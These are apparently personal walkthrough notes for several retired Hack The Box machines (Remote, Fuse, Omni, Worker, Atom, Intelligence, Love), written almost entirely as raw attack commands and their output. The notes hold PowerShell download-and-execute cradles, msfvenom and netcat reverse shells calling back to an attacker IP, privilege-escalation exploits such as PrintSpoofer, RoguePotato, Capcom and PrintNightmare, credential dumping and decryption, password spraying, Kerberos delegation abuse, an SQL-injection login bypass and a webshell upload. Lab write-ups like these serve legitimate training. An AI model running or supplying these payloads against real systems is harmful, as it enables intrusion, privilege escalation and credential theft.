python 49488.py -u 'admin' -p baconandcheese -i http://10.10.10.180/umbraco/ -c whoami
python 49488.py -u 'admin@htb.local' -p baconandcheese -i http://10.10.10.180/umbraco/ -c whoami
	#success
python 49488.py -u 'admin@htb.local' -p baconandcheese -i http://10.10.10.180/ -c whoami
python 49488.py -u 'admin@htb.local' -p baconandcheese -i http://10.10.10.180/ -c 'cmd.exe' -a '/c echo %cd%'
python 49488.py -u 'admin@htb.local' -p baconandcheese -i http://10.10.10.180/ -c 'powershell.exe' -a "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2/rev.ps1')"
rlwrap nc -lvp 4141
>whoami
	iis apppool\defaultapppool
	#after read write up there are another method reverse shell on limited rce with base64
echo 'IEX(New-Object Net.WebClient).downloadString("http://10.10.14.11/rev.ps1")' | iconv -t UTF-16LE | base64 -w0
python 49488.py -u 'admin@htb.local' -p baconandcheese -i http://10.10.10.180/ -c 'powershell.exe' -a "-E base64code"
rlwrap nc -lvp 4141
>whoami
	iis apppool\defaultapppool
>whoami /priv
	##privesc SeImpersonatePrivilege < windows 10 & server 2019 using printspoofer
	#Microsoft Windows Server 2019 Standard
	#10.0.17763 N/A Build 17763
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.11 LPORT=4444 -f exe > rshell.exe
>powershell "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.11/rshell.exe','rshell.exe')"
>powershell "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.11/PrintSpoofer.exe','psf.exe')"
>\psf.exe -c "\temp\rshell.exe" -i
rlwrap nc -lvp 4444
>whoami
	nt authority\system
	##another privesc RoguePotato
socat tcp-listen:135,reuseaddr,fork tcp:10.10.10.180:9999
>powershell "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.11/RoguePotato.exe','rp.exe')"
>powershell "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.11/RogueOxidResolver.exe','RogueOxidResolver.exe')"
>rp.exe -h
sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.10.180:9191
>rp.exe -r 10.10.14.11 -e "C:\temp\rshell.exe" -l 9191
	#sadly execution failed, somehow socat forward request got timeout, maybe 0xid resolver failed
	##another privesc abuse service miss configure
>winpeas.exe quite servicesinfo
	UsoSvc: AllAccess, Start
	#abuse service UsoSvc
>sc query UsoSvc
>sc qc UsoSvc
>sc.exe config UsoSvc binpath= "C:\temp\rshell.exe"
>sc.exe qc UsoSvc
>net stop UsoSvc
>net start UsoSvc
rlwrap nc -lvp 4444
>whoami
	nt authority\system
	##another privsc via administrator credential in TeamViewer7
	#https://whynotsecurity.com/blog/teamviewer/
>tasklist -V
	TeamViewer_Service.exe        2220
>dir C:\Program Files (x86)\teamviewer
	Version7
>cd HKLM:\software\wow6432node\teamviewer\version7
>reg query hklm\software\teamviewer /s
	SecurityPasswordAES    REG_BINARY    FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
>reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7\
	SecurityPasswordAES    REG_BINARY    FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
cat decrypt.sh
	#!/bin/bash
	ENCPASS=$1
	KEY=0602000000a400005253413100040000
	IV=0100010067244F436E6762F25EA8D704
	echo -n $ENCPASS \
	| xxd -p -r \
	| openssl enc -aes-128-cbc -d -nopad -K $KEY -iv $IV; echo
bash decrypt.sh FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
	#pass cracked !R3m0te!
smbmap -H 10.10.10.180 -u 'administrator' -p '!R3m0te!'
psexec.py 'administrator':'!R3m0te!'@10.10.10.180
	nt authority\system
	#reverse shell with runas powershell
>$username = "Remote\Administrator"
>$password = '!R3m0te!'
>$secstr = New-Object -TypeName System.Security.SecureString
>$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
>$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $username,$secstr
>Invoke-Command -ScriptBlock {whoami} -Credential $cred -Computer localhost
	remote\administrator
>Invoke-Command -ScriptBlock {IEX(New-Object Net.WebClient).downloadString('http://10.10.14.78/rshell.ps1')}
rlwrap nc -lvp 4242
>whoami
	remote\administrator








Fuse Hackthebox
========================================
sudo autorecon 10.10.10.193
	#fingerprint OS WIndows from SMB
crackmapexec smb 10.10.10.193
	Windows Server 2016 Standard 14393 x64
GetNPUsers -dc-ip 10.10.10.193 fabricorp.local/
	#enumerate kerberos login got nothing
http://10.10.10.193
	#website error redirect to fuse.fabricorp.local
nslookup fuse.fabricorp.local 10.10.10.193
http://fuse.fabricorp.local/papercut/logs/html/index.htm
	#got list user test wirh kerbrute
/opt/kerbrute userenum -d fabricorp.local --dc fabricorp.local user.txt
GetNPUsers -dc-ip 10.10.10.193 -usersfile user.txt fabricorp.local/
hydra -L user.txt -e nsr 10.10.10.193 smb
hydra -L user.txt -P /opt/rockyou.txt 10.10.10.193 smb
	#ldap found nothing
ldapsearch -H ldap://10.10.10.193:389 -x -b DC=fabricorp,DC=local
	#got stuck and nothing to do, sadly the hint is I have to Cewl website to create password list and dont forget Cewl --woith-numbers
cewl -w pass.lst -d 10 -m 3 --with-numbers http://fabricorp.local/papercut/logs/html/index.htm
crackmapexec smb 10.10.10.193 -u user.txt -p pass.lst -d fabricorp.local --continue-on-success | grep -v STATUS_LOGON_FAILURE
	#got gredz tlavel:Fabricorp01 with STATUS_PASSWORD_MUST_CHANGE
	#change password smb with smbpasswd
echo -e "Fabricorp01\nJembot123\nJembot123" | (smbpasswd -U tlavel -r 10.10.10.193)
smbmap -H 10.10.10.193 -u 'anonymous' -p 'asd' 
smbpasswd -U tlavel -r 10.10.10.193
rpcclient -U "tlavel" 10.10.10.193
>enumdomusers
	#got list users
>enumdomgroups
>enumprinters
	#password printed on printer description so enumerate with enumdomprinters
cat asd.txt | cut -d '[' -f 2 | cut -d ']' -f 1 > user.txt
crackmapexec smb 10.10.10.193 -u user.txt -p '$fab@s3Rv1ce$1' -d fabricorp.local --continue-on-success | grep -v STATUS_LOGON_FAILURE
crackmapexec winrm 10.10.10.193 -u svc-scan -p '$fab@s3Rv1ce$1' -d fabricorp.local
	#check winrm avaliable
evil-winrm -i 10.10.10.193 -u 'svc-print' -p '$fab@s3Rv1ce$1'
>whoami
	fabricorp\svc-print
>cd \
>dir /a
>winpeas.exe > winpeas-fuse.txt
>winpeas.exe
>cd departement
>dir /a /b /s
>whoami /priv
	SeLoadDriverPrivilege
	#https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges
	##privesc SeLoadDriverPrivilege
	#need 2 setup, load driver (Capcom.sys) to regitstry driver list and use exploit capcom to execute reverse shell
	#ttps://github.com/clubby789/ExploitCapcom/
wget https://github.com/clubby789/ExploitCapcom/releases/download/1.0/ExploitCapcom.exe
wget https://m4t3sz.gitlab.io/posts/htb/fuse/expl/seloaddriverpriv/Capcom.sys
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe > rshell.exe
ExploitCapcom.exe LOAD C:\temp\Capcom.sys
ExploitCapcom EXPLOIT whoami
	nt authority\system
>ExploitCapcom.exe EXPLOIT \temp\rhsell.exe
rlwrap nc -lvp 4444
>whoami
	nt authority\system






Omni Hackthebox
===================================
sudo autorecon 10.10.10.204
http://10.10.10.204:8080
	#login windows defice portal
	#search windows device portal exploit
	#windows IoT exploit RCE
git clone https://github.com/SafeBreach-Labs/SirepRAT
sudo pip3 install -r requirements.txt
python3 SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\Windows\System32\drivers\etc\hosts" --v
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c ping 10.10.14.3"
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c cd windowspowershell && dir > C:\data\users\defaultaccount\dsa4.txt"
python3 SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\data\users\defaultaccount\dsa4.txt" --v
	#got struggle and finally works with escape quote on payload, and I ran command as yesterday and today magicly works
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c cd c:\temp\ && copy \\\\10.10.14.3\\asd\\rshell.exe"
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c cd c:\temp\ && copy \\\\10.10.14.3\\asd\\nc64.exe"
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\temp\nc64.exe" --args "10.10.14.3 4242 -e cmd"
rlwrap nc -lvp 4242
>whoami
	#whoami disabled so another method to find whoami
>echo %USERDOMAIN%\%USERNAME%
	OMNI\DefaultAccount
>cd C:\Data\Users\
	#list file and directory recurse only show file
>dir /a-d /b /s
	#found nothing, try to find .bat file
>cd \
>dir *.bat /s /a /b
	C:\Program Files\WindowsPowerShell\Modules\PackageManagement\r.bat
>type C:\Program Files\WindowsPowerShell\Modules\PackageManagement\r.bat
	#got credz app:mesh5143 & administrator:_1nt3rn37ofTh1nGz
http://10.10.10.204:8080
	#back to website login as administrator and reverse shell
http://10.10.10.204:8080/#Run%20command
>echo %userdomain%\%username%
	OMNI\Administrator
>powershell
>cd \data\users\administrator && dir
	#find flag
>cd data\users\administrator
>type root.txt
	System.Management.Automation.PSCredential
	#password encrypted inside xml file
	#decrypt powershell secure string password
	#https://www.jaapbrasser.com/quickly-and-securely-storing-your-credentials-powershell/
>(import-clixml -path .\root.txt).getnetworkcredential() | format-list
	#got root.txt flag, on PSCredential encryption, only user can decrpypt their PSCredential encrypted file, not even SYSTEM
	#login as app to grap user.txt
http://10.10.10.204:8080/#Run%20command
>echo %userdomain%\%username%
	OMNI\app
>(import-clixml -path .\user.txt).getnetworkcredential() | format-list
>(import-clixml -path .\iot-admin.xml).getnetworkcredential() | format-list
	#got root and user txt
	##after read write up, there is something wrong with my path to get the flag
	#so the rat exploit can execute command as SYSTEM without "--as_logged_on_user" lol
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\temp\nc64.exe" --args "10.10.14.3 4242 -e cmd"
>echo %userdomain%\%username%
	WORKGROUP\omni$
>powershell
>[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
	NT AUTHORITY\SYSTEM
	#as system we can dump SAM and SYSTEM
>copy \windows\system32\config\sam \\10.10.14.3\asd\
	#failed trasnfer SMB, someone might be using smb to transfer SAM and SYSTEM file, so my smb transfer couldn't perform and so thats why my smb trasnfer yesterday failed to copy file and get a shell
	#add SAM adn SYSTEM to http accessable
	#find image or file on website and find on files
http://10.10.10.204:8080
http://10.10.10.204:8080/img/banner.png
>dir /a-d /s *banner.png /b
	C:\Windows\WebManagement\www\iot\img\banner.png
>cd C:\Windows\WebManagement\www\iot\
	#copy sam system with fast operation
>reg save HKLM\sam sam
>reg save HKLM\system system
wget http://10.10.10.204:8080/system --http-user=administrator --http-password=_1nt3rn37ofTh1nGz
wget http://10.10.10.204:8080/sam --http-user=administrator --http-password=_1nt3rn37ofTh1nGz
samdump2 system sam
	#samdump not really acurate try impacket secretdump there is security file option
>reg save HKLM\security security
wget http://10.10.10.204:8080/security --http-user=administrator --http-password=_1nt3rn37ofTh1nGz
secretsdump.py -sam sam -security security -system system LOCAL
hashcat -m 1000 hash.txt /opt/rockyou.txt
	#got credential on user app
	#the correct path is login as app, decrypt and get user.txt, 
	#decrypt iot-admin.xml and then got administrator user
	#cerypt and login to web then get reverse shell as administrator then decrypt root.txt
	##another method on limited rce is using powershell base64 encription command
	#find version of powershell
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c cd windowspowershell && dir > C:\data\users\defaultaccount\dsa4.txt"
python3 SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\data\users\defaultaccount\dsa4.txt" --v
	#version 1.0 C:\windows\system32\windowspowershell\v1.0\powershell.exe
echo 'IWR http://10.10.14.3/nc64.exe -O C:\Temp\nc64baru.exe' | iconv -t UTF-16LE | base64 -w0
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\windows\system32\windowspowershell\v1.0\powershell.exe" --args " -E b64"
python -m SimpleHTTPServer 80
>powershell
>[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
	NT AUTHORITY\SYSTEM







Worker Hackthebox
==========================================
sudo autorecon 10.10.10.203
nc 10.10.10.203 3690
	( success ( 2 2 ( ) ( edit-pipeline svndiff1 accepts-svndiff2 absent-entries commit-revprops depth log-revprops atomic-revprops partial-replay inherited-props ephemeral-txnprops file-revs-reverse list ) ) )
	#search it on google and return SVN service
	#anumerate svn service
svn list svn://10.10.10.203
	dimension.worker.htb/
	moved.txt
svn cat moved.txt
svn ls dimension.worker.htb
svn list -v
svn log svn://10.10.10.203 -v
svn checkout svn://10.10.10.203
svn diff -r2
svn up -r 2
cat deploy.ps1
	#got credz nathen:wendel98
http://dimension.worker.htb
	#there are another static website aplha.worker.htb, cartoon, lens, solid-state, spectral, story
http://devops.worker.htb
	#login to devops.worker.htb with user nathen
	#abuse Azure Devops
	in repo -> files -> there are repo another sub domain I mentiion (alpha, cartoon, etc)
	-> change repo to alpha -> (upload file disabled on master branch) -> create branch -> upload file
	-> create pull request -> add work item -> approve -> complete
wget https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
	#another complex tools webshell
	https://packetstormsecurity.com/files/60858/aspxshell.aspx.txt.html
http://alpha.worker.htb/cmd.aspx
	#reverse shell cmd aspx
	cd \ && mkdir temp
	cd \temp && certutil -urlcache -split -f http://10.10.14.3/nc.exe
	\temp\nc.exe -e cmd 10.10.14.3 4242
rlwrap nc -lvp 4242
>whoami
	iis apppool\defaultapppool
>winpeas.exe
	#after enumerate for hours I got nothing, I check hint on forum and someone said there is something in w:\
	#lol jokes on me I missed it, winpeas output already tell it
>W:
>dir /a-d /s /b
	#svn user pasword file
>type W:\svnrepos\www\conf\passwd
cat asd.txt | sed -e 's/\s/:/g' | cut -d : -f 1 > user.lst
cat asd.txt | sed -e 's/\s/:/g' | cut -d : -f 3 > pass.lst
	#brutefor user with crackmapaexec using winrm (port 5985 is open)
	#flag --no-bruteforce means that user and password will matched each line (first line user.lst matched with first line pass.lst)
crackmapexec winrm 10.10.10.203 -u user.lst  -p pass.lst  -d worker --continue-on-success --no-bruteforce
	10.10.10.203    5985   10.10.10.203     [+] worker\robisl:wolves11 (Pwn3d!)
psexec.py worker\robisl:wolves11@10.10.10.203
	#I forgot psexec using port 445
evil-winrm -i 10.10.10.203 -u robisl -p wolves11
>whoami
	worker\robisl
>winpeas.exe
	#winpeas got nothing
	#logout Azure Devops and login with user robisl failed
	#take a day to enumerate, exploit kernel ,etc got nothing
	#after read the walktrough it said login again in devops with user robisl
	#wrong thing here about Azure Devops if we authenticate on http://devops.worker.htb/ekenas/ (url after we logout) will fail
	#not only http://devops.worker.htb/ekenas/ but anywhere we logout and login with new user, website will redirect to page lastime we logout
	#to make login attempt success I has to login on http://devops.worker.htb
http://devops.worker.htb/
	#user robisl has privilede to create job on Azure Devops Pipe
	#privesc Azure Devops
	#Pipelines -> Build -> New Build Pipelines -> Use Azure Repos (this project) -> Create empty Pipelines
	#choose/add agent pool (setup) -> add task to agent job -> add command line -> add revese shell script
	#\temp\nc.exe -e cmd 10.10.14.3 4444 -> save and queue
rlwrap nc -lvp 4444
>whoami
	nt authority\system
	##another privesc RouguePotato from 0xdf
	#I try it just like Remote Box but failed
	#0xdf said listener port blocked by firewall so lets try with chisel like 0xdf did
	#lmao failed, try to bind port with chisel and plink still failed 
	[-] Could not open PID 0!)
	[-] RoguePotato something went wrong :-(
	#apparently I execute it as robisl lol
	#privsc RoguePotato SeImpersonatePrivilege
	#Microsoft Windows Server 2019 Standard
`	#0.0.17763 N/A Build 17763
>whoami
	iis apppool\defaultapppool
>whoami /priv
	SeImpersonatePrivilege
	#firewalll block inbound tcp, so it block OXID resolver
	#bypass firewall port forward chisel 1.6
wget https://github.com/jpillora/chisel/releases
gzip -d chisel_1.6.0_windows_386.gz
./chisel_1.6.0_linux_amd64 server -p 8000 --reverse
>chisel_1.6.0_windows_386 -h
>chisel_1.6.0_windows_386 client 10.10.14.3:8000 R:9191:localhost:9191
sudo socat tcp-listen:135,reuseaddr,fork tcp:127.0.0.1:9191
	#tunnel connected, execute RoguePotato
	#copy RoguePotato.exe and RogueOxidResolver.exe
>RoguePotato.exe -r 10.10.14.3 -l 9191 -e C:\temp\rshell.exe
	#Got system token but dont get a shell
	#change with .bat and success
>echo c:\temp\nc.exe -e cmd 10.10.14.3 4444 > rev.bat
>RoguePotato.exe -r 10.10.14.3 -l 9191 -e C:\temp\rev.bat
rlwrap nc -lvp 4444
>whoami
	nt authority\system









Atom Hackthebox
=========================================
sudo autorecon 10.10.10.237
smbmap-list-contents.txt
	#there are smb share with anonymous login
smbclient \\\\10.10.10.237\\Software_Updates
> recurse ON
> prompt OFF
> mget *
open UAT_Testing_Procedures.pdf 
	Note taking application built with electron-builder which helps users in taking important notes.
	#in pdf I had conclution that Heedv1 apps builded by electron-builder
	#there are update server running, and update file can be place in client folder on SMB then the server will kame auto-update from it
	#looking on google there are electron updater RCE, looks good right
	https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html
	#been try a days to analyze the heedv1.exe
	#when file openend, try to get connection to http://updates.atom.htb/latest.yml
http://updates.atom.htb/latest.yml
	#when visiting latest.yml got 404 error
	#IMO to get RCE we need to pack the heedv1.exe with the latest.yml file and add payload to latest.yml to get RCE
	#try to pack it with innosetup, with electron-packager be new exe file and upload it failed
	#spend a day to make it work and got nothing
	#try to analyze again with mona, so I had to install mona to my kali which is 1GB and still fail LOL
	#gave up again and watch writeup
	#sadly the method to get RCE is upload edited latest.yml with .exe payload to smb share
msfvenom -l payload | grep -i windows
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.3 lport=4242 -f exe > rshell64.exe
shasum -a 512 rshell64.exe | cut -d " " -f1 | xxd -r -p | base64 -w0
	#edit latest.yml as in https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html
	#I try to make it work change latest.yml and rev.exe somanytimes and my mistake are: I should arrange files variable in latest.yml
smbclient \\\\10.10.10.237\\Software_Updates
>cd client1
>put latest.yml
>put rshell64.exe r'shell64.exe
rlwrap nc -lvp 4242
>whoami
	atom\jason
	#abouse Portable Kanban
>cd \users\jason\download\portablekanban
>copy * \\10.10.14.3\asd
	#I copied all the file to my machine, there is exploit to decrypt hash inside PortableKanban.pk3
	#https://www.exploit-db.com/exploits/49409
python3 ex.py PortableKanban.pk3.lock
cat PortableKanban.pk3.lock
	#but there are no password file inside pk3 file
	#so I try to move all portable kanban file to my windows and open it
	#ofcourse connection database error because redis database on Atom box
	#but in config windows I can see redis auth pass kidvscat_yes_kidvscat
>netstat -ano
	TCP    [::]:6379              [::]:0                 LISTENING
	#abuse redis windows
	#https://book.hacktricks.xyz/pentesting/6379-pentesting-redis
redis-cli -h 10.10.10.237
>AUTH kidvscat_yes_kidvscat
>INFO
	# Keyspace
	db0:keys=4,expires=0,avg_ttl=0
>SELECT 0
>KEYS *
>GET "get pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0"
	...snip..."Name\":\"Administrator\",\"Initials\":\"\",\"Email\":\"\",\"EncryptedPassword\":\"Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\",\"R....snip...
	#got administrator hash
	#change ex.py portable kanban to get input hash
	print decode(sys.argv[1])
python3 ex-dcrypthash.py Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi
	#got credz administrator:kidvscat_admin_@123
evil-winrm -i 10.10.10.237 -u administrator -p kidvscat_admin_@123
>whoami
	atom\administrator
	##after read writeup, I dont need to run Portable Kanban to my windows to get password
	#just read portable kanban config file
>cd \users\jason\download\portablekanban
>type type portablekanban.cfg
	#got redis auth hash 
python3 ex-dcrypthash.py Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb
	#got redis auth pass kidvscat_yes_kidvscat LOL
	##AND THERE IS PRINTNIGHTMARE privsc  CVE-2021-1675
>whoami
	atom\jason
>systeminfo
	Microsoft Windows 10 Pro
	10.0.19042 N/A Build 19042
>powershell
wget https://github.com/calebstewart/CVE-2021-1675/blob/main/CVE-2021-1675.ps1
>copy \\10.10.14.3\asd\CVE-2021-1675.ps1 .
>import-module .\CVE-2021-1675.ps1
	#got security error, we can bypass with Invoke-Expression (IEX)
>iex(new-object net.webclient).downloadstring('http://10.10.14.3/CVE-2021-1675.ps1')
>IEX(cat CVE-2021-1675.ps1 -raw)
	#module loaded
>Invoke-Nightmare -NewUser asdasd -NewPassword asdasd
>net user asd
	Local Group Memberships      *Administrators
	#holly fcking crap!
evil-winrm -i 10.10.10.237 -u asd -p asdasd
>whoami
	atom\asd
psexec.py asd:asdasd@10.10.10.237
>whoami
	nt authority\system
	#SharpPrintNightmare.exe
	#in some case rev.dll works but adduserdll dont
msfvenom -p windows/x64/exec cmd='net group "domain admins" melanie /add /domain' --platform windows -f dll > add.dll
>SharpPrintNightmare.exe C:\temp\rev.dll
rlwrap nc -lvp 4141
>whoami
	nt authority\system
	##detect print nighmare
rpcdump.py @10.10.10.237 | grep MS-RPRN
Get-Service -Name Spooler
REG QUERY "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"











Intelligence Hackthebox
==========================================
sudo autorecon 10.10.10.248
cat tcp_80_http_dirb.txt
http://intelligence.htb/
	#there are 2020-01-01-upload.pdf and 2020-12-15-upload.pdf
	#so there is a change another pdf file
http://intelligence.htb/documents/2020-12-20-upload.pdf
	#bash loop inside loop for wget download pdf
mkdir downloadpdf && cd downloadpdf
for i in {11..12};do for j in {01..31};do wget http://10.10.10.248/documents/2020-$i-$j-upload.pdf;done;done
	#there are pdf creator that might be user for the box
exiftool 2020-12-20-upload.pdf
	#dump creator as user
exiftool * | grep -i creator | sort -u | cut -d ':' -f 2 | cut -d ' ' -f 2 > user.txt
	#check user no password authentication to AD, kerberos, rpc, smb
/opt/kerbrute userenum -d intelligence.htb --dc intelligence.htb user.txt
GetNPUsers.py -usersfile user.txt -dc-ip 10.10.10.248 intelligence.htb/
crackmapexec smb 10.10.10.248 -u user.txt -p '' -d intelligence.htb
for i in $(cat user.txt);do echo -n $i======= && rpcclient -U '$i' 10.10.10.248 -N;done 
	#no one lol
	#get lost on here then looking up on forum someone said there is something in pdf
	#because i dont have good scripting in python execpt buffer overflow so I open the file one by one, there are abot 88 pdf files :(
	#got default password NewIntelligenceCorpUser9876
crackmapexec smb 10.10.10.248 -u user.txt -p 'NewIntelligenceCorpUser9876' -d intelligence.htb
	#got credz Tiffany.Molina:NewIntelligenceCorpUser9876
smbclient \\\\10.10.10.248\\Users -U Tiffany.Molina
> recurse ON
> prompt OFF
> mget *
	#got user.txt
smbclient \\\\10.10.10.248\\IT -U Tiffany.Molina
>get downdetector.ps1
cat downdetector.ps1
	oreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
	try {$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
	#there is ps1 script downdetector website from Ted
	#the script will list all inside DNS that has web* and invoke-webrequest to check
	#of couse flag -UseDefaultCredentials he invoke it with kerberosting
	#so I have to point it to our machine
	#google on "exploit CN=MicrosoftDNS,DC=DomainDnsZones" (lol script kiddie google query)
	#so the box using Active Directory Integrated DNS (ADIDNS), idk about it bcs I suck on windows, then stepped on this site relaying kerberos
	#https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/
git clone https://github.com/dirkjanm/krbrelayx/
python dnstool.py -u intelligence\\tiffany.molina -p NewIntelligenceCorpUser9876 -r webweb -a add -d 10.10.14.29 10.10.10.248
nslookup webweb.intelligence.htb 10.10.10.248
	Name:   webweb.intelligence.htb
	Address: 10.10.14.29
	#lol it works, so to receive kerberoasting request use responder
sudo responder -i 10.10.14.29 -I tun0
	Ted.Graves::intelligence:616842cff7d1dc69:4EBE512F11F11B9C2EC7FF48A3A6D4CD:010100000000000030AEA44B9...snip...
	#got Ted.Graves NTLMv2 hash, then crack NTLMv2 hash
hashcat -m 5600 hash.txt /opt/rockyou.txt
	#got credz Ted.Graves:Mr.Teddy
	#try to enumerate a day using ted and lead to nothing
	#walk into forum again and someone said "we are dealing with AD and LDAP"
	#dump ldap
ldapdomaindump 10.10.10.248 -u intelligence.htb\\tiffany.molina -p NewIntelligenceCorpUser9876 --no-json --no-grep
ldapdomaindump 10.10.10.248 -u intelligence.htb\\ted.grave -p Mr.Teddy --no-json --no-grep
	#inside AD domain computer accounts there are svc_int.intelligence.htb which TRUSTED_TO_AUTH_FOR_DELEGATION
	#and dc.intelligence.htb which has flag TRUSTED_FOR_DELEGATION
	#the flag is indicate to be vurnerable website "relaying kerberos"
	#http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html
pywerview get-netuser -u Ted.Graves -p Mr.Teddy -d intelligence.htb -t dc.intelligence.htb --unconstrained
pywerview get-netuser -u Ted.Graves -p Mr.Teddy -d intelligence.htb -t dc.intelligence.htb --allow-delegation
pywerview get-netuser -u Ted.Graves -p Mr.Teddy -d intelligence.htb -t dc.intelligence.htb --spn
GetUserSPNs.py intelligence.htb/Ted.Graves:Mr.Teddy -dc-ip 10.10.10.248 -request-user unconstrained
GetUserSPNs.py intelligence.htb/Ted.Graves:Mr.Teddy -dc-ip 10.10.10.248 -request
	#got nothing
pywerview get-netcomputer -u Ted.Graves -p Mr.Teddy -w intelligence.htb --dc-ip 10.10.10.248 --full-data
pywerview get-netcomputer -u Ted.Graves -p Mr.Teddy -w intelligence.htb -d svc_int.intelligence.htb --dc-ip 10.10.10.248
	msds-allowedtodelegateto: WWW/dc.intelligence.htb
	#error UnicodeDecodeError: 'utf-8' codec can't decode byte 0x80
	#so this spn has privilege to delegate to spn www/dc.intelligence.htb
	#I can impersonate as administrator to dc.intelligence.htb
	#but I dont have any access or credz to SPN svc_int
	#somehow because Ted.Graves in group itsupport, he can dump SPN svc_inc hash
	#group managed service accounts in Active Directory (gMSA)
git clone https://github.com/micahvandeusen/gMSADumper
python3 gMSADumper.py -u ted.graves -p Mr.Teddy -d intelligence.htb
	svc_int$:::d170ae19de30439df55d6430e12dd621
	#impersonate as administrator to get a ticket
impacket-getST 'intelligence.htb/svc_int\$' -hashes :d170ae19de30439df55d6430e12dd621 -spn www/dc.intelligence.htb -impersonate Administrator
	KRB_AP_ERR_SKEW(Clock skew too great)
	#error timestamp sync with DC
sudo apt remove ntp
sudo timedatectl set-ntp off
sudo ntpdate -u 10.10.10.248
impacket-getST 'intelligence.htb/svc_int\$' -hashes :d170ae19de30439df55d6430e12dd621 -spn www/dc.intelligence.htb -impersonate Administrator
	[*] Saving ticket in Administrator.ccache
	#got administrator ticket for dc.intelligence.htb
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass Administrator@dc.intelligence.htb
psexec.py -k -no-pass  -target-ip 10.10.10.248 administrator@dc.intelligence.htb
>whoami
	nt authority\system










Love Hackthebox
=========================================
sudo autorecon 10.10.10.229
http://10.10.10.229:5000
	403 Forbidden
http://10.10.10.229/index.php
	#voting system voterID:password
http://10.10.10.229/admin/index.php
	#voting system username:password
	#can check user exist or not, user admin exist
	#got stuck for hours because those two url lead to different login
searchsploit votting system
searchsploit voting system
	#exploit voting system sqli to rce
	#auth bypass sqli
searhsploit -m 49843
cat 49843.txt
	login=yea&password=userexist&username=userdoesntexist' UNION SELECT 1,2,"$2y$12$jRwyQyXnktvFrlryHNEhXOeKQYX7/5VK2ZdfB9f/GcJLuPahJWZ9K",4,5,6,7 from INFORMATION_SCHEMA.SCHEMATA;-- -
http://10.10.10.229/admin/index.php
	login=yea&password=admin&username=dsfgdf' UNION SELECT 1,2,"$2y$12$jRwyQyXnktvFrlryHNEhXOeKQYX7/5VK2ZdfB9f/GcJLuPahJWZ9K",4,5,6,7 from INFORMATION_SCHEMA.SCHEMATA;-- -
	#login with sqli auth bypass payload
	#got login as admin
http://10.10.10.239/admin/home.php
	#add position and add candidate with photo with php windows php reverse shell
	#https://github.com/ivan-sincek/php-reverse-shell
http://10.10.10.239/admin/positions.php
http://10.10.10.239/admin/candidates.php
http://10.10.10.239/images/rev.php
rlwrap nc -lvp 4242
>whoami
	love\phoebe
>winpeas.exe > winpeas-love.txt
	AlwaysInstallElevated set to 1 in HKLM!
	AlwaysInstallElevated set to 1 in HKCU!
>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
	    AlwaysInstallElevated    REG_DWORD    0x1
	#privesc alwaysinstallelevated
msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.29 LPORT=4444 -f msi -o rev4.msi
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.29 LPORT=4444 -f msi-nouac -o rev4-nouac.msi
>msiexec /quiet /qn /i rev4.msi
>msiexec /q /i rev4.msi
	#applocker bypass
>msiexec /q /i http://10.10.14.29/rev4.png
rlwrap nc -lvp 4444
>whoami
	nt authority\system
	##when the machine release there are no exploit sqli auth bypass on it
	#so it should from CSRF to get user password and login
